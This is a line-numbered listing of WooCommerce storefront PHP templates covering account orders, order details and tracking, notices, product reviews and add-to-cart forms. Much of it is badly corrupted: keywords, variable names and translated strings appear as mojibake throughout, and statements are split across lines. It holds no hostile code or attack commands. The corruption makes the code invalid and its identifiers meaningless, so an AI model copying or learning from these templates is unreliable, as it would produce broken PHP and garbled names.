Ğ'% fÜ % ™em', '% fÜ % ™ems', 
$™em_couÁ
, 'woocomm”û' ), 
$Üd”
->
	`g‘_fÜm©‹d_Üd”_tÙ®
(), $item_count ); ?>

63 </
td
>

64 <
td
 
şass
="order-actions">

65 <?
php


66 
$aùiÚs
 = 
	`¬¿y
();

68 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_·ym’t', 
	`¬¿y
( 'pending', 'failed' ), $order ) ) ) {

69 
$aùiÚs
['·y'] = 
	`¬¿y
(

70 'u¾' => 
$Üd”
->
	`g‘_checkout_·ym’t_u¾
(),

71 'Çme' => 
	`__
( 'Pay', 'woocommerce' )

75 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_ÿnûl', 
	`¬¿y
( 'pending', 'failed' ), $order ) ) ) {

76 
$aùiÚs
['ÿnûl'] = 
	`¬¿y
(

77 'u¾' => 
$Üd”
->
	`g‘_ÿnûl_Üd”_u¾
Ğ
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) ),

78 'Çme' => 
	`__
( 'Cancel', 'woocommerce' )

82 
$aùiÚs
['v›w'] = 
	`¬¿y
(

83 'u¾' => 
$Üd”
->
	`g‘_v›w_Üd”_u¾
(),

84 'Çme' => 
	`__
( 'View', 'woocommerce' )

87 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_Üd”s_aùiÚs', $aùiÚs, 
$Üd”
 );

89 ià(
$aùiÚs
) {

90 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$key
 => 
$aùiÚ
 ) {

91 
echo
 '<¨h»f="' . 
	`esc_u¾
Ğ
$aùiÚ
['u¾'] ) . '" cÏss="bu‰Ú ' . 
	`§n™ize_html_şass
Ğ
$key
 ) . '">' . 
	`esc_html
( $action['name'] ) . '</a>';

95 </
td
>

96 </
Œ
><?
php


97 
	}
}

98 ?></
	gtbody
>

100 </
	gbË
>

102 <?
php
 
	g’dif
; ?>

	@templates/myaccount/view-order.php

1 <?
php


12 iàĞ! 
defšed
( 'ABSPATH' ) ) {

13 
	gex™
;

17 <?
php
 
wc_´št_nÙiûs
(); ?>

19 <
p
 
	gşass
="Üd”-šfo"><?
php
 
´štf
Ğ
__
Ğ'Ord” <m¬k cÏss="Üd”-numb”">%s</m¬k> wa ¶aûd oÀ<m¬k cÏss="Üd”-d©e">%s</m¬k>‡nd i cu¼’y <m¬k cÏss="Üd”-¡©us">%s</m¬k>.', 'woocomm”û' ), 
$Üd”
->
g‘_Üd”_numb”
(), 
d©e_i18n
Ğ
g‘_İtiÚ
Ğ'd©e_fÜm©' ), 
¡¹Ùime
Ğ$Üd”->
Üd”_d©e
 ) ), __Ğ
$¡©us
->
Çme
, 'woocomm”û' ) ); ?></
	gp
>

21 <?
php
 iàĞ
	g$nÙes
 = 
$Üd”
->
	$g‘_cu¡om”_Üd”_nÙes
() ) :

23 <
h2
><?
php
 
	`_e
( 'Order Updates', 'woocommerce' ); ?></h2>

24 <
Ş
 
şass
="commentlist‚otes">

25 <?
php
 
	$fÜ—ch
 ( 
$nÙes
 
as
 
$nÙe
 ) : ?>

26 <
li
 
şass
="comment‚ote">

27 <
div
 
şass
="comment_container">

28 <
div
 
şass
="comment-text">

29 <
p
 
şass
="m‘a"><?
php
 
echo
 
	`d©e_i18n
Ğ
	`__
Ğ'ÈjS \o\àF Y, h:Ÿ', 'woocomm”û' ), 
	`¡¹Ùime
Ğ
$nÙe
->
comm’t_d©e
 ) ); ?></p>

30 <
div
 
şass
="description">

31 <?
php
 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$nÙe
->
comm’t_cÚ‹Á
 ) ); ?>

32 </
div
>

33 <
div
 
şass
="clear"></div>

34 </
div
>

35 <
div
 
şass
="clear"></div>

36 </
div
>

37 </
li
>

38 <?
php
 
’dfÜ—ch
; ?>

39 </
Ş
>

40 <?
php


41 
’dif
;

43 
	`do_aùiÚ
Ğ'woocomm”û_v›w_Üd”', 
$Üd”_id
 );

	@templates/notices/error.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 iàĞ! 
	g$mes§ges
 ) ;

14 <
ul
 
	gşass
="woocommerce-error">

15 <?
php
 
	$fÜ—ch
 ( 
$mes§ges
 
as
 
$mes§ge
 ) : ?>

16 <
li
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$mes§ge
 ); ?></li>

17 <?
php
 
’dfÜ—ch
; ?>

18 </
ul
>

	@templates/notices/notice.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 iàĞ! 
	g$mes§ges
 ) ;

15 <?
php
 
	$fÜ—ch
 ( 
$mes§ges
 
as
 
$mes§ge
 ) : ?>

16 <
div
 
şass
="woocomm”û-šfo"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$mes§ge
 ); ?></div>

17 <?
php
 
’dfÜ—ch
; ?>

	@templates/notices/success.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 iàĞ! 
	g$mes§ges
 ) ;

15 <?
php
 
	$fÜ—ch
 ( 
$mes§ges
 
as
 
$mes§ge
 ) : ?>

16 <
div
 
şass
="woocomm”û-mes§ge"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$mes§ge
 ); ?></div>

17 <?
php
 
’dfÜ—ch
; ?>

	@templates/order/form-tracking.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
, 
	g$po¡
;

15 <
fÜm
 
	gaùiÚ
="<?ph°echØesc_u¾Ğg‘_³rm®škĞ$po¡->ID ) ); ?>" 
m‘hod
="po¡" 
şass
="track_order">

17 <
p
><?
php
 
_e
Ğ'TØŒack you¸Üd”…Ëa£ƒÁ” you¸Ord” ID iÀthbox b–ow‡nd…»s »tuº. Thi wa giv’Øyou oÀyou¸»ûˆªd iÀthcÚfœm©iÚƒma you should hav»ûived.', 'woocomm”û' ); ?></
	gp
>

19 <
p
 
	gşass
="fÜm-row fÜm-row-fœ¡"><
Ïb–
 ="Üd”id"><?
php
 
_e
Ğ'Ord” ID', 'woocomm”û' ); ?></
	gÏb–
> <
šput
 cÏss="šput-‹xt" 
ty³
="‹xt" 
Çme
="Üd”id" 
id
="Üd”id" 
¶aûhŞd”
="<?php _e( 'Found in your order confirmationƒmail.', 'woocommerce' ); ?>" /></p>

20 <
p
 
şass
="fÜm-row fÜm-row-Ï¡"><
Ïb–
 ="Üd”_ema"><?
php
 
_e
Ğ'Blšg Ema', 'woocomm”û' ); ?></
	gÏb–
> <
šput
 
	gşass
="šput-‹xt" 
ty³
="‹xt" 
Çme
="Üd”_ema" 
id
="Üd”_ema" 
¶aûhŞd”
="<?php _e( 'Email you used during checkout.', 'woocommerce' ); ?>" /></p>

21 <
div
 
şass
="clear"></div>

23 <
p
 
şass
="fÜm-row"><
šput
 
ty³
="subm™" cÏss="bu‰Ú" 
Çme
="Œack" 
v®ue
="<?php _e( 'Track', 'woocommerce' ); ?>" /></p>

24 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-order_tracking' ); ?>

26 </
	gfÜm
>

	@templates/order/order-details.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 
	g$Üd”
 = 
Ãw
 
WC_Ord”
Ğ
$Üd”_id
 );

16 <
	gh2
><?
php
 
_e
( 'Order Details', 'woocommerce' ); ?></h2>

17 <
bË
 
	gşass
="shop_table order_details">

18 <
th—d
>

19 <
Œ
>

20 <
th
 
şass
="´oduù-Çme"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

21 <
th
 
	gşass
="´oduù-tÙ®"><?
php
 
_e
Ğ'TÙ®', 'woocomm”û' ); ?></
	gth
>

22 </
	gŒ
>

23 </
	gth—d
>

24 <
	gtfoÙ
>

25 <?
php


26 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
(èè
	$fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) :

28 <
Œ
>

29 <
th
 
scİe
="row"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

30 <
td
><?
php
 
echo
 
$tÙ®
['value']; ?></td>

31 </
Œ
>

32 <?
php


33 
’dfÜ—ch
;

35 </
tfoÙ
>

36 <
tbody
>

37 <?
php


38 iàĞĞ
$Üd”
->
	`g‘_™ems
() ) > 0 ) {

40 
	`fÜ—ch
Ğ
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

41 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_´oduù', 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 ), $item );

42 
$™em_m‘a
 = 
Ãw
 
	`WC_Ord”_I‹m_M‘a
Ğ
$™em
['™em_m‘a'], 
$_´oduù
 );

45 <
Œ
 
şass
="<?phpƒchoƒsc_attr(‡pply_filters( 'woocommerce_order_item_class', 'order_item', $item, $order ) ); ?>">

46 <
td
 
şass
="product-name">

47 <?
php


48 iàĞ
$_´oduù
 && ! $_´oduù->
	`is_visibË
() )

49 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Çme', 
$™em
['name'], $item );

51 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Çme', 
	`¥rštf
Ğ'<¨h»f="%s">%s</a>', 
	`g‘_³rm®šk
Ğ
$™em
['product_id'] ), $item['name'] ), $item );

53 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_quªt™y_html', ' <¡rÚg cÏss="´oduù-quªt™y">' . 
	`¥rštf
Ğ'&times; %s', 
$™em
['qty'] ) . '</strong>', $item );

55 
$™em_m‘a
->
	`di¥Ïy
();

57 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& $_´oduù->
	`is_dowÆßdabË
(è&& 
$Üd”
->
	`is_dowÆßd_³rm™‹d
() ) {

59 
$dowÆßd_fes
 = 
$Üd”
->
	`g‘_™em_dowÆßds
Ğ
$™em
 );

60 
$i
 = 0;

61 
$lšks
 = 
	`¬¿y
();

63 
	`fÜ—ch
 ( 
$dowÆßd_fes
 
as
 
$dowÆßd_id
 => 
$fe
 ) {

64 
$i
++;

66 
$lšks
[] = '<sm®l><¨h»f="' . 
	`esc_u¾
Ğ
$fe
['dowÆßd_u¾'] ) . '">' . 
	`¥rštf
Ğ
	`__
Ğ'DowÆßd fe%s', 'woocomm”û' ), ( 
	`couÁ
Ğ
$dowÆßd_fes
 ) > 1 ? ' ' . 
$i
 . ': ' : ': ' ) ) . 
	`esc_html
( $file['name'] ) . '</a></small>';

69 
echo
 '<br/>' . 
	`im¶ode
Ğ'<br/>', 
$lšks
 );

72 </
td
>

73 <
td
 
şass
="product-total">

74 <?
php
 
echo
 
$Üd”
->
	`g‘_fÜm©‹d_lše_subtÙ®
Ğ
$™em
 ); ?>

75 </
td
>

76 </
Œ
>

77 <?
php


79 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
	`¬¿y
Ğ'´oûssšg', 'com¶‘ed' ) ) && ( 
$purcha£_nÙe
 = 
	`g‘_po¡_m‘a
Ğ
$_´oduù
->
id
, '_purcha£_nÙe', 
Œue
 ) ) ) {

81 <
Œ
 
şass
="product-purchase-note">

82 <
td
 
cŞ¥ª
="3"><?
php
 
echo
 
	`­¶y_f‹rs
Ğ'the_cÚ‹Á', 
$purcha£_nÙe
 ); ?></td>

83 </
Œ
>

84 <?
php


87 
	}
}

89 
do_aùiÚ
Ğ'woocomm”û_Üd”_™ems_bË', 
$Üd”
 );

91 </
	gtbody
>

92 </
	gbË
>

94 <?
php
 
do_aùiÚ
Ğ'woocomm”û_Üd”_d‘as_aá”_Üd”_bË', 
$Üd”
 ); ?>

96 <
	gh—d”
>

97 <
	gh2
><?
php
 
_e
( 'Customer details', 'woocommerce' ); ?></h2>

98 </
	gh—d”
>

99 <
dl
 
	gşass
="customer_details">

100 <?
php


101 iàĞ
$Üd”
->
blšg_ema
 ) 
echo
 '<dt>' . 
__
Ğ'Ema:', 'woocomm”û' ) . '</dt><dd>' . 
	g$Üd”
->
	gblšg_ema
 . '</dd>';

102 iàĞ
	g$Üd”
->
	gblšg_phÚe
 ) 
	gecho
 '<dt>' . 
__
( 'Telephone:', 'woocommerce' ) . '</dt><dd>' . $order->billing_phone . '</dd>';

105 
do_aùiÚ
Ğ'woocomm”û_Üd”_d‘as_aá”_cu¡om”_d‘as', 
$Üd”
 );

107 </
	gdl
>

109 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_ship_to_billing_address_only' ) === 'no' && get_option( 'woocommerce_calc_shipping' ) !== 'no' ) : ?>

111 <
div
 
şass
="col2-set‡ddresses">

113 <
div
 
şass
="col-1">

115 <?
php
 
’dif
; ?>

117 <
h—d”
 
	gşass
="title">

118 <
h3
><?
php
 
_e
Ğ'Blšg Add»ss', 'woocomm”û' ); ?></
	gh3
>

119 </
	gh—d”
>

120 <
	gadd»ss
><
	gp
>

121 <?
php


122 iàĞ! 
	g$Üd”
->
	$g‘_fÜm©‹d_blšg_add»ss
(èè
	`_e
Ğ'N/A', 'woocomm”û' ); 
echo
 
$Üd”
->
	`g‘_fÜm©‹d_blšg_add»ss
();

124 </
p
></
add»ss
>

126 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_ship_to_billing_address_only' ) === 'no' && get_option( 'woocommerce_calc_shipping' ) !== 'no' ) : ?>

128 </
div
><!-- /.
cŞ
-1 -->

130 <
div
 
şass
="col-2">

132 <
h—d”
 
şass
="title">

133 <
h3
><?
php
 
	`_e
( 'Shipping Address', 'woocommerce' ); ?></h3>

134 </
h—d”
>

135 <
add»ss
><
p
>

136 <?
php


137 iàĞ! 
$Üd”
->
	$g‘_fÜm©‹d_shpšg_add»ss
(èè
	`_e
Ğ'N/A', 'woocomm”û' ); 
echo
 
$Üd”
->
	`g‘_fÜm©‹d_shpšg_add»ss
();

139 </
p
></
add»ss
>

141 </
div
><!-- /.
cŞ
-2 -->

143 </
div
><!-- /.
cŞ2
-
£t
 -->

145 <?
php
 
’dif
; ?>

147 <
div
 
şass
="clear"></div>

	@templates/order/tracking.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

15 <?
php


16 
	g$¡©us
 = 
g‘_‹rm_by
Ğ'¦ug', 
$Üd”
->
¡©us
, 'shop_order_status' );

18 
	g$Üd”_¡©us_‹xt
 = 
¥rštf
Ğ
__
Ğ'Ord” % which wa mad% ha th¡©u &ldquo;%s&rdquo;', 'woocomm”û' ), 
$Üd”
->
g‘_Üd”_numb”
(), 
humª_time_diff
Ğ
¡¹Ùime
Ğ$Üd”->
Üd”_d©e
 ), 
cu¼’t_time
Ğ'time¡amp' ) ) . ' ' . __Ğ'ago', 'woocomm”û' ), __Ğ
$¡©us
->
Çme
, 'woocommerce' ) );

20 iàĞ
	g$Üd”
->
	g¡©us
 ==ğ'com¶‘ed' ) 
$Üd”_¡©us_‹xt
 .ğ' ' . 
__
Ğ'ªd wa com¶‘ed', 'woocomm”û' ) . ' ' . 
humª_time_diff
Ğ
¡¹Ùime
Ğ
$Üd”
->
com¶‘ed_d©e
 ), 
cu¼’t_time
( 'timestamp' ) ) . __( '‡go', 'woocommerce' );

22 
	g$Üd”_¡©us_‹xt
 .= '.';

24 
echo
 
w·utİ
Ğ
esc_©Œ
Ğ
­¶y_f‹rs
Ğ'woocomm”û_Üd”_Œackšg_¡©us', 
$Üd”_¡©us_‹xt
, 
$Üd”
 ) ) );

27 <?
php


28 
	g$nÙes
 = 
$Üd”
->
g‘_cu¡om”_Üd”_nÙes
();

29 iàĞ
	g$nÙes
 ) :

31 <
h2
><?
php
 
_e
Ğ'Ord” Upd©es', 'woocomm”û' ); ?></
	gh2
>

32 <
Ş
 
	gşass
="commentlist‚otes">

33 <?
php
 
	$fÜ—ch
 ( 
$nÙes
 
as
 
$nÙe
 ) : ?>

34 <
li
 
şass
="comment‚ote">

35 <
div
 
şass
="comment_container">

36 <
div
 
şass
="comment-text">

37 <
p
 
şass
="m‘a"><?
php
 
echo
 
	`d©e_i18n
Ğ
	`__
Ğ'ÈjS \o\àF Y, h:Ÿ', 'woocomm”û' ), 
	`¡¹Ùime
Ğ
$nÙe
->
comm’t_d©e
 ) ); ?></p>

38 <
div
 
şass
="description">

39 <?
php
 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
	`wp_k£s_po¡
Ğ
$nÙe
->
comm’t_cÚ‹Á
 ) ) ); ?>

40 </
div
>

41 <
div
 
şass
="clear"></div>

42 </
div
>

43 <
div
 
şass
="clear"></div>

44 </
div
>

45 </
li
>

46 <?
php
 
’dfÜ—ch
; ?>

47 </
Ş
>

48 <?
php


49 
’dif
;

52 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_v›w_Üd”', 
$Üd”
->
id
 ); ?>

	@templates/single-product-reviews.php

1 <?
php


9 
glob®
 
	g$woocomm”û
, 
	g$´oduù
;

11 iàĞ! 
defšed
( 'ABSPATH' ) )

12 
	gex™
;

14 iàĞ! 
	$comm’ts_İ’
() )

17 <
div
 
id
="reviews">

18 <
div
 
id
="comments">

19 <
h2
><?
php


20 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_’abË_»v›w_¿tšg' ) ==ğ'yes' && ( 
$couÁ
 = 
$´oduù
->
	$g‘_¿tšg_couÁ
() ) )

21 
	`´štf
Ğ
	`_n
Ğ'% »v›w fÜ %s', '% »v›w fÜ %s', 
$couÁ
, 'woocomm”û' ), $couÁ, 
	`g‘_the_t™Ë
() );

23 
	`_e
( 'Reviews', 'woocommerce' );

24 ?></
h2
>

26 <?
php
 iàĞ
	$have_comm’ts
() ) : ?>

28 <
Ş
 
şass
="commentlist">

29 <?
php
 
	`wp_li¡_comm’ts
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_»v›w_li¡_¬gs', 
	`¬¿y
( 'callback' => 'woocommerce_comments' ) ) ); ?>

30 </
Ş
>

32 <?
php
 iàĞ
	`g‘_comm’t_·ges_couÁ
(è> 1 && 
	`g‘_İtiÚ
( 'page_comments' ) ) :

33 
echo
 '<nav class="woocommerce-pagination">';

34 
	`·gš©e_comm’ts_lšks
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_comm’t_·gš©iÚ_¬gs', 
	`¬¿y
(

39 
echo
 '</nav>';

40 
’dif
; ?>

42 <?
php
 : ?>

44 <
p
 
şass
="woocomm”û-nÜev›ws"><?
php
 
	`_e
( 'There‡re‚o„eviews yet.', 'woocommerce' ); ?></p>

46 <?
php
 
’dif
; ?>

47 </
div
>

49 <?
php
 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_»v›w_¿tšg_v”ifiÿtiÚ_»quœed' ) ==ğ'no' || 
	`wc_cu¡om”_bought_´oduù
Ğ'', 
	`g‘_cu¼’t_u£r_id
(), 
$´oduù
->
id
 ) ) : ?>

51 <
div
 
id
="review_form_wrapper">

52 <
div
 
id
="review_form">

53 <?
php


54 
$comm’‹r
 = 
	`wp_g‘_cu¼’t_comm’‹r
();

56 
$comm’t_fÜm
 = 
	`¬¿y
(

57 't™Ë_»¶y' => 
	`have_comm’ts
(è? 
	`__
Ğ'Add‡„ev›w', 'woocomm”û' ) : __Ğ'Bthfœ¡Ø»v›w', 'woocomm”û' ) . ' &ldquo;' . 
	`g‘_the_t™Ë
() . '&rdquo;',

58 't™Ë_»¶y_to' => 
	`__
( 'Leave‡ Replyo %s', 'woocommerce' ),

61 'f›lds' => 
	`¬¿y
(

62 'authÜ' => '<°şass="comm’t-fÜm-authÜ">' . '<Ïb– fÜ="authÜ">' . 
	`__
( 'Name', 'woocommerce' ) . ' <span class="required">*</span></label> ' .

63 '<špuˆid="authÜ"‚ame="authÜ"y³="‹xt" v®ue="' . 
	`esc_©Œ
Ğ
$comm’‹r
['comment_author'] ) . '" size="30"‡ria-required="true" /></p>',

64 'ema' => '<°şass="comm’t-fÜm-ema"><Ïb– fÜ="ema">' . 
	`__
( 'Email', 'woocommerce' ) . ' <span class="required">*</span></label> ' .

65 '<špuˆid="ema"‚ame="ema"y³="‹xt" v®ue="' . 
	`esc_©Œ
Ğ
$comm’‹r
['comment_author_email'] ) . '" size="30"‡ria-required="true" /></p>',

67 'Ïb–_subm™' => 
	`__
( 'Submit', 'woocommerce' ),

72 iàĞ
	`g‘_İtiÚ
( 'woocommerce_enable_review_rating' ) === 'yes' ) {

73 
$comm’t_fÜm
['comm’t_f›ld'] = '<°şass="comm’t-fÜm-¿tšg"><Ïb– fÜ="¿tšg">' . 
	`__
( 'Your Rating', 'woocommerce' ) .'</label><select‚ame="rating" id="rating">

74 <
İtiÚ
 
v®ue
="">' . __Ğ'
R©e
&
h–l
;', '
woocomm”û
' ) . '</option>

75 <
İtiÚ
 
v®ue
="5">' . __Ğ'
P”ãù
', '
woocomm”û
' ) . '</option>

76 <
İtiÚ
 
v®ue
="4">' . __Ğ'
Good
', '
woocomm”û
' ) . '</option>

77 <
İtiÚ
 
v®ue
="3">' . __Ğ'
Av”age
', '
woocomm”û
' ) . '</option>

78 <
İtiÚ
 
v®ue
="2">' . __Ğ'
NÙ
 
th©
 
bad
', '
woocomm”û
' ) . '</option>

79 <
İtiÚ
 
v®ue
="1">' . __Ğ'
V”y
 
PoÜ
', '
woocomm”û
' ) . '</option>

80 </
£Ëù
></
p
>';

81 
	}
}

83 
	g$comm’t_fÜm
['comm’t_f›ld'] .ğ'<°şass="comm’t-fÜm-comm’t"><Ïb– fÜ="comm’t">' . 
__
( 'Your Review', 'woocommerce' ) . '</label><textarea id="comment"‚ame="comment" cols="45"„ows="8"‡ria-required="true"></textarea></p>';

85 
comm’t_fÜm
Ğ
­¶y_f‹rs
Ğ'woocomm”û_´oduù_»v›w_comm’t_fÜm_¬gs', 
$comm’t_fÜm
 ) );

87 </
	gdiv
>

88 </
	gdiv
>

90 <?
php
 : ?>

92 <
p
 
şass
="woocomm”û-v”ifiÿtiÚ-»quœed"><?
php
 
_e
Ğ'OÆy†ogged iÀcu¡om” whØhavpurcha£dhi ´oduù may†—v¨»v›w.', 'woocomm”û' ); ?></
	gp
>

94 <?
php
 
	g’dif
; ?>

96 <
div
 
	gşass
="clear"></div>

97 </
div
>

	@templates/single-product.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
g‘_h—d”
( 'shop' ); ?>

16 <?
php


23 
do_aùiÚ
( 'woocommerce_before_main_content' );

26 <?
php
  
	$have_po¡s
(èè: 
	`the_po¡
(); ?>

28 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'single-product' ); ?>

30 <?
php
 
’dwhe
;

32 <?
php


38 
	`do_aùiÚ
( 'woocommerce_after_main_content' );

41 <?
php


47 
	`do_aùiÚ
( 'woocommerce_sidebar' );

50 <?
php
 
	`g‘_foÙ”
( 'shop' ); ?>

	@templates/single-product/add-to-cart/external.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 <?
php
 
do_aùiÚ
( 'woocommerce_before_add_to_cart_button' ); ?>

15 <
p
 
	gşass
="cart">

16 <
a
 
h»f
="<?ph°echØesc_u¾Ğ$´oduù_u¾ ); ?>" 
»l
="nofŞlow" 
şass
="sšgË_add_to_ÿ¹_bu‰Ú bu‰Ú‡É"><?
php
 
echo
 
$bu‰Ú_‹xt
; ?></
	ga
>

17 </
	gp
>

19 <?
php
 
do_aùiÚ
( 'woocommerce_after_add_to_cart_button' ); ?>

	@templates/single-product/add-to-cart/grouped.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
, 
	g$po¡
;

14 
	g$·»Á_´oduù_po¡
 = 
$po¡
;

16 
do_aùiÚ
( 'woocommerce_before_add_to_cart_form' ); ?>

18 <
fÜm
 
	gşass
="ÿ¹" 
m‘hod
="po¡" 
’ùy³
='multipart/form-data'>

19 <
bË
 
ûÎ¥acšg
="0" 
şass
="group_table">

20 <
tbody
>

21 <?
php


22 
	$fÜ—ch
 ( 
$grou³d_´oduùs
 
as
 
$´oduù_id
 ) :

23 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

24 
$po¡
 = 
$´oduù
->
po¡
;

25 
	`£tup_po¡d©a
Ğ
$po¡
 );

27 <
Œ
>

28 <
td
>

29 <?
php
 iàĞ
$´oduù
->
	`is_sŞd_šdividu®ly
(è|| ! $´oduù->
	$is_purcha§bË
() ) : ?>

30 <?
php
 
	`woocomm”û_‹m¶©e_loİ_add_to_ÿ¹
(); ?>

31 <?
php
 : ?>

32 <?
php


33 
$quªt™es_»quœed
 = 
Œue
;

34 
	`woocomm”û_quªt™y_šput
Ğ
	`¬¿y
Ğ'šput_Çme' => 'quªt™y[' . 
$´oduù_id
 . ']', 'input_value' => '0' ) );

36 <?
php
 
’dif
; ?>

37 </
td
>

39 <
td
 
şass
="label">

40 <
Ïb–
 ="product-<?phpƒcho $product_id; ?>">

41 <?
php
 
echo
 
$´oduù
->
	`is_visibË
(è? '<¨h»f="' . 
	`g‘_³rm®šk
(è. '">' . 
	`g‘_the_t™Ë
() . '</a>' : get_the_title(); ?>

42 </
Ïb–
>

43 </
td
>

45 <?
php
 
	`do_aùiÚ
 ( 'woocomm”û_grou³d_´oduù_li¡_befÜe_´iû', 
$´oduù
 ); ?>

47 <
td
 
şass
="price">

48 <?
php


49 
echo
 
$´oduù
->
	`g‘_´iû_html
();

51 iàĞĞ
$avaab™y
 = 
$´oduù
->
	`g‘_avaab™y
() ) && $availability['availability'] )

52 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_html', '<°şass="¡ock ' . 
	`esc_©Œ
Ğ
$avaab™y
['şass'] ) . '">' . 
	`esc_html
( $availability['availability'] ) . '</p>', $availability['availability'] );

54 </
td
>

55 </
Œ
>

56 <?
php


57 
’dfÜ—ch
;

60 
$po¡
 = 
$·»Á_´oduù_po¡
;

61 
$´oduù
 = 
	`g‘_´oduù
Ğ
$·»Á_´oduù_po¡
->
ID
 );

62 
	`£tup_po¡d©a
Ğ
$·»Á_´oduù_po¡
 );

64 </
tbody
>

65 </
bË
>

67 <
šput
 
ty³
="hidd’" 
Çme
="add-to-ÿ¹" 
v®ue
="<?phpƒchoƒsc_attr( $product->id ); ?>" />

69 <?
php
 iàĞ
$quªt™es_»quœed
 ) : ?>

71 <?
php
 
	`do_aùiÚ
( 'woocommerce_before_add_to_cart_button' ); ?>

73 <
bu‰Ú
 
ty³
="subm™" 
şass
="sšgË_add_to_ÿ¹_bu‰Ú bu‰Ú‡É"><?
php
 
echo
 
$´oduù
->
	`sšgË_add_to_ÿ¹_‹xt
(); ?></button>

75 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_add_to_cart_button' ); ?>

77 <?
php
 
’dif
; ?>

78 </
fÜm
>

80 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_add_to_cart_form' ); ?>

	@templates/single-product/add-to-cart/simple.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
, 
	g$´oduù
;

14 iàĞ! 
	g$´oduù
->
	$is_purcha§bË
() ) ;

17 <?
php


19 
$avaab™y
 = 
$´oduù
->
	`g‘_avaab™y
();

21 iàĞ
$avaab™y
['availability'] )

22 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_html', '<°şass="¡ock ' . 
	`esc_©Œ
Ğ
$avaab™y
['şass'] ) . '">' . 
	`esc_html
( $availability['availability'] ) . '</p>', $availability['availability'] );

25 <?
php
 iàĞ
$´oduù
->
	$is_š_¡ock
() ) : ?>

27 <?
php
 
	`do_aùiÚ
( 'woocommerce_before_add_to_cart_form' ); ?>

29 <
fÜm
 
şass
="ÿ¹" 
m‘hod
="po¡" 
’ùy³
='multipart/form-data'>

30 <?
php
 
	`do_aùiÚ
( 'woocommerce_before_add_to_cart_button' ); ?>

32 <?
php


33 iàĞ! 
$´oduù
->
	$is_sŞd_šdividu®ly
() )

34 
	`woocomm”û_quªt™y_šput
Ğ
	`¬¿y
(

35 'mš_v®ue' => 
	`­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_mš', 1, 
$´oduù
 ),

36 'max_v®ue' => 
	`­¶y_f‹rs
Ğ'woocomm”û_quªt™y_šput_max', 
$´oduù
->
	`backÜd”s_®lowed
(è? '' : $´oduù->
	`g‘_¡ock_quªt™y
(), $product )

40 <
šput
 
ty³
="hidd’" 
Çme
="add-to-ÿ¹" 
v®ue
="<?phpƒchoƒsc_attr( $product->id ); ?>" />

42 <
bu‰Ú
 
ty³
="subm™" 
şass
="sšgË_add_to_ÿ¹_bu‰Ú bu‰Ú‡É"><?
php
 
echo
 
$´oduù
->
	`sšgË_add_to_ÿ¹_‹xt
(); ?></button>

44 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_add_to_cart_button' ); ?>

45 </
fÜm
>

47 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_add_to_cart_form' ); ?>

49 <?
php
 
’dif
; ?>

	@templates/single-product/add-to-cart/variable.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
